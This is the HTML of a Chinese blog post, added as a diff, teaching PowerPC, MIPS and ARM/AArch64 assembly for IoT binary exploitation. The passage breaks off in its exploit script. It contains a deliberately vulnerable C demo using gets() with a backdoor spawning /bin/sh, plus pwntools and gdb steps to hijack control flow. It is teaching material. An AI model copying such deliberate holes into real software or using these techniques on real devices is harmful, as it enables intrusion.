@@ -1,0 +1,580 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>异架构汇编 | X1z1的个人博客</title><meta name="author" content="xizi"><meta name="copyright" content="xizi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="异架构汇编异架构汇编存在三种，分别是PowerPC，ARM&amp;AARCH64，MIPS 从 x86 到 RISCx86 是 CISC（复杂指令集），而 ARM、MIPS、PowerPC 均属于 RISC（精简指令集）。  Load&#x2F;Store 架构：RISC 架构不能直接对内存中的数据进行加减乘除等运算。必须先将数据 Load 到寄存器中，在寄存器里完成运算，然后再 Store 回">
+<meta property="og:type" content="website">
+<meta property="og:title" content="异架构汇编">
+<meta property="og:url" content="http://example.com/2026/07/16/%E5%BC%82%E6%9E%B6%E6%9E%84%E6%B1%87%E7%BC%96/index.html">
+<meta property="og:site_name" content="X1z1的个人博客">
+<meta property="og:description" content="异架构汇编异架构汇编存在三种，分别是PowerPC，ARM&amp;AARCH64，MIPS 从 x86 到 RISCx86 是 CISC（复杂指令集），而 ARM、MIPS、PowerPC 均属于 RISC（精简指令集）。  Load&#x2F;Store 架构：RISC 架构不能直接对内存中的数据进行加减乘除等运算。必须先将数据 Load 到寄存器中，在寄存器里完成运算，然后再 Store 回">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.jpg">
+<meta property="article:published_time" content="2026-07-16T07:39:14.000Z">
+<meta property="article:modified_time" content="2026-07-22T07:43:01.435Z">
+<meta property="article:author" content="xizi">
+<meta property="article:tag" content="IOT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><script type="application/ld+json"></script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/07/16/%E5%BC%82%E6%9E%B6%E6%9E%84%E6%B1%87%E7%BC%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '异架构汇编',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'posts'
+}</script><link rel="stylesheet" href="/css/_custom/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url(/img/bg.jepg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1z1的个人博客</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div></div></nav><div id="page-site-info"><h1 id="site-title">异架构汇编</h1></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="异架构汇编"><a href="#异架构汇编" class="headerlink" title="异架构汇编"></a>异架构汇编</h1><p>异架构汇编存在三种，分别是<code>PowerPC，ARM&amp;AARCH64，MIPS</code></p>
+<h2 id="从-x86-到-RISC"><a href="#从-x86-到-RISC" class="headerlink" title="从 x86 到 RISC"></a>从 x86 到 RISC</h2><p>x86 是 CISC（复杂指令集），而 ARM、MIPS、PowerPC 均属于 RISC（精简指令集）。</p>
+<ol>
+<li><strong>Load&#x2F;Store 架构</strong>：RISC 架构不能直接对内存中的数据进行加减乘除等运算。必须先将数据 Load 到寄存器中，在寄存器里完成运算，然后再 Store 回内存。</li>
+<li><strong>寄存器数量多</strong>：通常有 32 个以上的通用寄存器。因此，函数传参主要依赖寄存器，而不是像早期 x86 那样依赖栈。</li>
+<li><strong>指令定长</strong>：大多数情况下指令长度固定为 4 字节（除了 ARM 的 Thumb 模式），这对 ROP 链的构造和 shellcode 的编写影响巨大。</li>
+</ol>
+<h2 id="PowerPC-工业控制与汽车电子"><a href="#PowerPC-工业控制与汽车电子" class="headerlink" title="PowerPC(工业控制与汽车电子)"></a>PowerPC(工业控制与汽车电子)</h2><p><code>PowerPC</code> 架构下的函数调用约定是通过寄存器传递参数，而不是通过栈传递参数。但当参数数量过多时，会将多余的参数压入栈中，因此栈帧中也会包含函数参数。</p>
+<p><strong>寄存器设计复杂</strong>：拥有 32 个通用寄存器 (GPR)，还有专门的链接寄存器 (LR)、计数器寄存器 (CTR) 和条件寄存器 (CR)。</p>
+<p><strong>栈帧结构</strong>：PowerPC 没有专门的帧指针寄存器，且它的栈不仅用于保存局部变量，还会在函数入口分配极大的空间，用来保存调用者的环境状态。</p>
+<p><strong>指令晦涩</strong>：指令助记符繁多且复杂（例如各种条件跳转 <code>b</code>, <code>bl</code>, <code>bctr</code>, <code>blr</code> 等），初期阅读难度较大。</p>
+<h4 id="常用寄存器"><a href="#常用寄存器" class="headerlink" title="常用寄存器"></a>常用寄存器</h4><table>
+<thead>
+<tr>
+<th>寄存器</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>R1&#x2F;SP</td>
+<td>栈顶指针。</td>
+</tr>
+<tr>
+<td>R3</td>
+<td>存储函数调用的第一个参数或函数的返回值。</td>
+</tr>
+<tr>
+<td>R4-R10</td>
+<td>函数或系统调用的参数，部分情况下R4寄存器也会作为函数的返回值使用。</td>
+</tr>
+<tr>
+<td>LR</td>
+<td>链接寄存器，用于存放函数调用结束处的返回地址。</td>
+</tr>
+<tr>
+<td>PC</td>
+<td>程序计数器。</td>
+</tr>
+</tbody></table>
+<h4 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h4><p><code>PowerPC</code> 架构的指令通常使用缩写的单词组合来表示其功能</p>
+<ul>
+<li>**STB：**Store Byte（存储字节）</li>
+<li>**STW：**Store Word（存储字）</li>
+<li><strong>LD：<strong>Load（加载，将数据从</strong>内存</strong>中读取到寄存器中）</li>
+<li>**LI：**Load Immediate（加载立即数）</li>
+<li>**LIS：**Load Immediate and Shift（装载一个16位立即数到目标寄存器，并将它左移16位，用零填充低位）</li>
+<li>**LWZ：**Load Word and Zero（从内存读取一个字单元到寄存器中，并将高位清零）</li>
+<li>**BL：**Branch and Link（当前程序返回地址存入寄存器 <strong>LR</strong> 并跳转）</li>
+<li>**MTCTR：**Move to Count Register（将一个32位寄存器的值存储到寄存器 <strong>CTR</strong>）</li>
+<li>**BCTRL：**Branch to Count Register and Link（用于调用函数，将当前程序返回地址存入寄存器 <strong>LR</strong> 并跳去执行寄存器 <strong>CTR</strong> 指向的指令）</li>
+<li><strong>@符号</strong> 通常用于表示地址的高位和低位。</li>
+</ul>
+<p>PowerPC (PPC) 的栈帧设计最为特殊，它强制要求严格的<strong>栈回溯链（Back Chain）</strong>。</p>
+<ul>
+<li><p><strong>关键寄存器</strong>：<code>R1</code> (栈指针 SP)。PPC 通常没有专门的帧指针。<code>LR</code> 是特殊寄存器，不能直接运算。</p>
+</li>
+<li><p><strong>栈帧布局</strong>（从高地址到低地址）：</p>
+<ol>
+<li><strong>参数保存区</strong>（可选）。</li>
+<li><strong>局部变量与寄存器保存区</strong>。</li>
+<li><strong>LR 保存位置</strong>：<strong>PPC 函数的返回地址（LR）不保存在自己的栈帧里，而是保存在调用者（Caller）的栈帧里</strong>（通常位于 <code>SP + 4</code> 或 <code>SP + 8</code> 的位置）。</li>
+<li><strong>Back Chain (栈顶)</strong>：当前栈指针 <code>SP (R1)</code> 指向的内存位置 <code>0(R1)</code>，永远存放着<strong>上一个栈帧的 SP 指针</strong>。这使得 PPC 可以形成一个完美的链表，极其方便调试器进行回溯。</li>
+</ol>
+</li>
+<li><p><strong>汇编特征 (Prologue &#x2F; 序言)</strong>：</p>
+<p>代码段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mflr r0                  ; 将 LR 寄存器的值移入 R0 (LR不能直接存内存)</span><br><span class="line">stw r0, <span class="number">4</span>(r1)            ; 【关键】将返回地址存入上一个栈帧的预留位置</span><br><span class="line">stwu r1, <span class="number">-0x40</span>(r1)       ; 将旧的 SP (r1) 存入新的栈顶，同时更新 r1 开辟 <span class="number">0x40</span> 空间 </span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="MIPS-传统路由器的统治者"><a href="#MIPS-传统路由器的统治者" class="headerlink" title="MIPS(传统路由器的统治者)"></a>MIPS(传统路由器的统治者)</h2><p>TP-Link、Netgear 等路由器固件中极为常见，在网络设备领域占据主导。</p>
+<ul>
+<li><strong>分支延迟槽 (Branch Delay Slot)</strong>：这是 MIPS 最反直觉的特性。<strong>在跳转指令（如 <code>j</code>、<code>jal</code>）后面的第一条指令，会在跳转真正发生前执行</strong>。阅读汇编时必须习惯将跳转和它的下一条指令绑在一起看。</li>
+<li><strong>大小端问题</strong>：MIPS 有大端序 (mips) 和小端序 (mipsel)，这是需要特别注意的坑点。</li>
+<li><strong>调用约定</strong>：前 4 个参数用 <code>$a0-$a3</code> 传递，返回值存在 <code>$v0</code>，返回地址存在 <code>$ra</code>。</li>
+<li><strong>缓存一致性 (Cache Coherency)</strong>：由于指令缓存和数据缓存分离，自己写入的 shellcode 有时需要显式刷新指令缓存才能被 CPU 执行（通常通过特定的系统调用）。</li>
+</ul>
+<h3 id="指令集学习"><a href="#指令集学习" class="headerlink" title="指令集学习"></a>指令集学习</h3><p>各寄存器作用如下</p>
+<table>
+<thead>
+<tr>
+<th>REGISTER</th>
+<th>NAME</th>
+<th>USAGE</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$0</td>
+<td>$zero</td>
+<td>存储常量 0 (constant value 0)</td>
+</tr>
+<tr>
+<td>$1</td>
+<td>$at</td>
+<td>保留给汇编器 (Reserved for assembler)</td>
+</tr>
+<tr>
+<td>$2-$3</td>
+<td>$v0-$v1</td>
+<td>存放函数调用返回值或表达式 (values for results and expression evaluation)</td>
+</tr>
+<tr>
+<td>$4-$7</td>
+<td>$a0-$a3</td>
+<td>作为函数调用的前四个参数 (arguments)</td>
+</tr>
+<tr>
+<td>$8-$15</td>
+<td>$t0-$t7</td>
+<td>供汇编程序使用的临时寄存器 临时变量</td>
+</tr>
+<tr>
+<td>$16-$23</td>
+<td>$s0-$s7</td>
+<td>调用子函数时 用于保存原寄存器的值 (saved)</td>
+</tr>
+<tr>
+<td>$24-$25</td>
+<td>$t8-$t9</td>
+<td>供汇编程序使用的临时寄存器 补充<em>t</em>0−t7</td>
+</tr>
+<tr>
+<td>$26-$27</td>
+<td>k0−k1</td>
+<td>中断&#x2F;异常处理程序使用 保存系统参数</td>
+</tr>
+<tr>
+<td>$28</td>
+<td>$gp</td>
+<td>全局指针 (Global Pointer)</td>
+</tr>
+<tr>
+<td>$29</td>
+<td>$sp</td>
+<td>堆栈指针 (Stack Pointer)</td>
+</tr>
+<tr>
+<td>$30</td>
+<td>$fp</td>
+<td>帧指针 (Frame Pointer)</td>
+</tr>
+<tr>
+<td>$31</td>
+<td>$ra</td>
+<td>返回地址 (return address)</td>
+</tr>
+</tbody></table>
+<p>除此以外还有 3 个特殊的寄存器，分别是 PC (程序计数器)、HI (乘除结果高位寄存器)、LO (乘除结果低位寄存器)</p>
+<h2 id="ARM-AArch64-最主流的-IoT-架构"><a href="#ARM-AArch64-最主流的-IoT-架构" class="headerlink" title="ARM &#x2F; AArch64 (最主流的 IoT 架构)"></a>ARM &#x2F; AArch64 (最主流的 IoT 架构)</h2><p>广泛应用于智能家居设备、移动端、树莓派等。</p>
+<ul>
+<li><strong>执行状态与指令集</strong>：<ul>
+<li>包含 <strong>ARM 模式</strong> (32位定长指令) 和 <strong>Thumb 模式</strong> (16位&#x2F;32位变长指令)。常利用这两者的切换来绕过坏字符或复用 ROP gadget。</li>
+<li><strong>AArch64</strong> (64位)：寄存器名称从 <code>R0-R15</code> 变成了 <code>X0-X30</code>。</li>
+</ul>
+</li>
+<li><strong>函数调用约定 (ATPCS)</strong>：前 4 个参数用 <code>R0-R3</code> 传递（AArch64 是 <code>X0-X7</code>），多余的入栈。返回值存放在 <code>R0</code>。</li>
+<li><strong>关键寄存器</strong>：<ul>
+<li><code>R11</code> (FP)：帧指针，类似 <code>ebp</code>。</li>
+<li><code>R13</code> (SP)：栈指针，类似 <code>esp</code>。</li>
+<li><code>R14</code> (LR)：链接寄存器。<strong>函数调用时，返回地址存放在 <code>LR</code>，而不是直接压入栈中</strong>。控制程序执行流时，覆盖保存的 <code>LR</code> 值是关键。</li>
+<li><code>R15</code> (PC)：程序计数器，类似 <code>eip</code>。</li>
+</ul>
+</li>
+</ul>
+<h3 id="指令集学习-1"><a href="#指令集学习-1" class="headerlink" title="指令集学习"></a>指令集学习</h3><h4 id="常用寄存器-1"><a href="#常用寄存器-1" class="headerlink" title="常用寄存器"></a>常用寄存器</h4><table>
+<thead>
+<tr>
+<th>寄存器</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>R0</td>
+<td>存储函数的第一个参数或函数的返回结果。</td>
+</tr>
+<tr>
+<td>R13 （堆栈指针SP）</td>
+<td>指向堆栈的顶部</td>
+</tr>
+<tr>
+<td>R14（链接寄存器LR）</td>
+<td>链接寄存器，用于存放函数调用结束处的返回地址。</td>
+</tr>
+<tr>
+<td>R15（程序计数器PC）</td>
+<td>程序计数器。</td>
+</tr>
+</tbody></table>
+<p>arm32 下，read 的系统调用号是 3，execve 的系统调用号是 0xb</p>
+<p>由 r7 来存储系统调用号，r0,r1,r2 为函数调用的前三个参数</p>
+<h4 id="常用指令-1"><a href="#常用指令-1" class="headerlink" title="常用指令"></a>常用指令</h4><ul>
+<li><strong>MOV：</strong> 数据传输指令，用于将数据从一个寄存器或内存中复制到另一个寄存器或内存中。</li>
+<li><strong>ADD&#x2F;SUB：</strong> 加法和减法指令。</li>
+<li><strong>CMP：</strong> 比较指令，比较两个操作数的大小关系。</li>
+<li><strong>B：</strong> 分支指令，用于无条件跳转到指定地址。</li>
+<li><strong>BL：</strong> 分支指令，用于跳转到指定地址并将返回地址保存在LR寄存器中，可用于函数调用。</li>
+<li><strong>LDR&#x2F;STR：</strong> 数据传输指令，用于从内存中读取数据或将数据写入内存。<ul>
+<li><code>LDR</code> 用于将某些内容从内存加载到寄存器中，例如 <code>LDR R2, [R0]</code> 从R0寄存器中存储的内存地址的值读入R2寄存器。</li>
+<li><code>STR</code> 用于将某些内容从寄存器存储到内存地址中，例如 <code>STR R2, [R1]</code> 从R2寄存器中将值存储到R1寄存器中的内存地址中。</li>
+</ul>
+</li>
+<li><strong>PUSH&#x2F;POP：</strong> 栈操作指令，用于将寄存器中的数据入栈或从栈中弹出数据。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>功能</th>
+<th>指令</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MOV</td>
+<td>移动数据</td>
+<td>EOR</td>
+<td>按位异或</td>
+</tr>
+<tr>
+<td>MVN</td>
+<td>移动数据并取反</td>
+<td>LDR</td>
+<td>加载</td>
+</tr>
+<tr>
+<td>ADD</td>
+<td>加法</td>
+<td>STR</td>
+<td>存储</td>
+</tr>
+<tr>
+<td>SUB</td>
+<td>减法</td>
+<td>LDM</td>
+<td>加载多个</td>
+</tr>
+<tr>
+<td>MUL</td>
+<td>乘法</td>
+<td>STM</td>
+<td>存储多个</td>
+</tr>
+<tr>
+<td>LSL</td>
+<td>逻辑左移</td>
+<td>PUSH</td>
+<td>入栈</td>
+</tr>
+<tr>
+<td>LSR</td>
+<td>逻辑右移</td>
+<td>POP</td>
+<td>出栈</td>
+</tr>
+<tr>
+<td>ASR</td>
+<td>算术右移</td>
+<td>B</td>
+<td>跳转</td>
+</tr>
+<tr>
+<td>ROR</td>
+<td>右旋</td>
+<td>BL</td>
+<td>Link+跳转</td>
+</tr>
+<tr>
+<td>CMP</td>
+<td>比较</td>
+<td>BX</td>
+<td>分支跳转</td>
+</tr>
+<tr>
+<td>AND</td>
+<td>按位与</td>
+<td>BLX</td>
+<td>Linx+分支跳转</td>
+</tr>
+<tr>
+<td>ORR</td>
+<td>按位或</td>
+<td>SWI&#x2F;SVC</td>
+<td>系统调用</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p><strong>叶子函数（Leaf Function）</strong>：函数体内<strong>没有</strong>调用（<code>call</code>&#x2F;<code>bl</code>）任何其他函数的函数。它是调用链的末端。</p>
+</li>
+<li><p><strong>非叶子函数（Non-leaf Function）</strong>：函数体内<strong>有</strong>调用其他函数的函数。它需要保存和恢复自身的返回地址。</p>
+</li>
+<li><p><strong>非叶子函数（劫持稳定且直接）</strong>：由于它必然将返回地址（x86的<code>EIP</code>或ARM的<code>LR</code>）保存在<strong>栈上的固定位置</strong>，栈溢出时，覆盖该保存值即可在函数退出时精准劫持。<strong>攻击偏移量容易计算</strong>（通常在 <code>ebp+4</code> 或栈顶下方固定偏移）。</p>
+</li>
+<li><p><strong>叶子函数（劫持危险性高但脆弱）</strong>：在 ARM 中，叶子函数返回时直接从 <code>LR</code> 寄存器跳转，而 <code>LR</code> 通常不保存在栈上。如果单纯覆盖栈上数据，<strong>可能根本碰不到返回地址</strong>，劫持失败。在 x86 中，虽返回地址在栈顶，但叶子函数栈帧极小，溢出时极易先破坏相邻栈变量或产生段错误（Segmentation Fault），导致劫持还没来得及发生程序就崩溃了。</p>
+</li>
+</ul>
+<p>所以我们在劫持程序执行流的时候一般选择非叶子函数。</p>
+<p>为了简单接触一下这些架构，笔者写了一个简单栈溢出的demo来进行静态分析与动态调试。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========== PWNED! ==========\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Control flow hijacked successfully!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">16</span>]; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Buffer starts at: %p\n&quot;</span>, buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your payload: \n&quot;</span>);</span><br><span class="line">    gets(buffer);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data received!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Target function backdoor is at: %p\n&quot;</span>, backdoor);</span><br><span class="line">    vuln();  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Exiting normally.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ARM64"><a href="#ARM64" class="headerlink" title="ARM64"></a>ARM64</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x1z1@x1z1:~/Desktop/demo/ARM$ file arm64</span><br><span class="line">arm64: ELF 64-bit LSB executable, ARM aarch64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=01fd504f08177970be4f5c3829cacb2d6ac14cfe, <span class="keyword">for</span> GNU/Linux 3.7.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>这里就简单从64位入手了。我们这里都是静态链接的。</p>
+<p>然后根据之前pwn的学习，就可以知道，这里的<code>gets</code>存在一个明显的栈溢出。而且溢出长度不限。</p>
+<p>关键这里是我们要去确定溢出长度。那我们进gdb动态调试一下。同时注意，要注意<code>LR</code>在哪。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./arm64&#x27;)</span></span><br><span class="line">io = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>, <span class="string">&#x27;./arm64&#x27;</span>])</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">backdoor = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(backdoor))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;payload:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>然后这里就是说明架构，<code>-g 1234</code>，说明调试端口。</p>
+<p>然后我们需要另开终端去进行动态调试。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack</span><br><span class="line">00:0000│ x29 sp 0x55007ffdd0 —▸ 0x55007ffdf0 —▸ 0x55007ffe00 —▸ 0x55007fff10 ◂— 0</span><br><span class="line">01:0008│+008    0x55007ffdd8 —▸ 0x4007c8 (main+116) ◂— 0x912ae000d00002c0</span><br><span class="line">02:0010│ x0     0x55007ffde0 ◂— 0x61616161 /* <span class="string">&#x27;aaaa&#x27;</span> */</span><br><span class="line">03:0018│+018    0x55007ffde8 ◂— 1</span><br><span class="line">04:0020│+020    0x55007ffdf0 —▸ 0x55007ffe00 —▸ 0x55007fff10 ◂— 0</span><br><span class="line">05:0028│+028    0x55007ffdf8 —▸ 0x400884 (__libc_start_call_main+84) ◂— 0x940051d294001587</span><br><span class="line">06:0030│+030    0x55007ffe00 —▸ 0x55007fff10 ◂— 0</span><br><span class="line">07:0038│+038    0x55007ffe08 —▸ 0x400c04 (__libc_start_main_impl+836) ◂— 0x900004e3f9401002</span><br></pre></td></tr></table></figure>
+
+<p>这里我们其实看不出来<code>LR</code>在哪。不过我们可以看到<code>main</code>函数的返回位置<code>__libc_start_call_main+84</code>。我们可以通过覆盖<code>main</code>函数返回位置，同样做到劫持程序流。因为我们的的缓冲区起始地址 <code>0x55007ffde0</code>，高于 <code>vuln</code> 保存返回地址的位置 <code>0x55007ffdd8</code>。所以我们的 <code>payload</code> 永远不可能覆盖到 <code>vuln</code> 自己的返回地址。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./arm64&#x27;</span>)</span><br><span class="line"><span class="comment">#io = 